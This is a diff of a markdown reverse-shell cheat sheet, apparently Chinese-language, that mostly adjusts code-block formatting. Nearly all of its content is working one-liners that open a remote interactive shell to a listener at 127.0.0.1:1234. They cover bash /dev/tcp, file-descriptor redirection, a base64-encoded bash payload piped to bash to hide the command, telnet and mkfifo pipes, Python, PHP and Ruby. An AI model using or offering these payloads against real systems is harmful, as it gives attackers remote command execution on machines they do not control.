@@ -34,27 +34,31 @@ nc -u -lvp 1234
 ![agent](../images/WechatIMG54.jpeg)
 
 ```bash
-
-
 0<&196;exec 196<>/dev/tcp/127.0.0.1/1234; sh <&196 >&196 2>&196
+
+```
 ![agent](../images/WeChat9c018fc36b0256b4286d528e3e91651a.png)
 
+```bash
 exec 5<>/dev/tcp/127.0.0.1/1234; while read line 0<&5; do $line 2>&5 >&5; done
+
+```
 
 ![agent](../images/WechatIMG56.jpeg)
 
-
+```bash
 nohup bash -c 'bash -i >& /dev/tcp/127.0.0.1/1234 0>&1'
-
 
 base64搞一下命令
 
 echo "nohup bash -c 'bash -i >& /dev/tcp/127.0.0.1/1234 0>&1'" | base64 -w0
 echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTIzNCAwPiYxJwo= | base64 -d | bash 2>/dev/null
 
+```
+
 ![agent](../images/WechatIMG55.jpeg)
 
-```
+
 
 
 
@@ -64,7 +68,7 @@ telnet 127.0.0.1 1234 | /bin/sh #Blind
 
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet 127.0.0.1 1234 >/tmp/f
 
-telnet 127.0.0.1 1234 | /bin/bash | telnet 127.0.0.1 1234
+telnet 127.0.0.1 1234 | /bin/bash | telnet 127.0.0.1 12345
 
 rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet 127.0.0.1 1234 1>/tmp/bkpipe
 ```
@@ -91,8 +95,8 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 php -r '$sock=fsockopen("127.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 
-
 ```
+
 
 ![agent](../images/WechatIMG54.jpeg)
 
@@ -101,15 +105,14 @@ php -r '$sock=fsockopen("127.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```php
 php -r 'exec("/bin/bash -i >& /dev/tcp/127.0.0.1/1234")'
 
-
 ```
+
 ![agent](../images/WechatIMG53.jpeg)
 
 
 ```ruby
 
 ruby -rsocket -e'f=TCPSocket.open("127.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
-
 
 ```
 
@@ -258,16 +261,10 @@ int main(void){
 ```
 
 
-在带有公网的机器上开启监听
-
-```bash
-
-nc -nvlp 1234
-
-```
 
 
 
+Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash
 
 
 
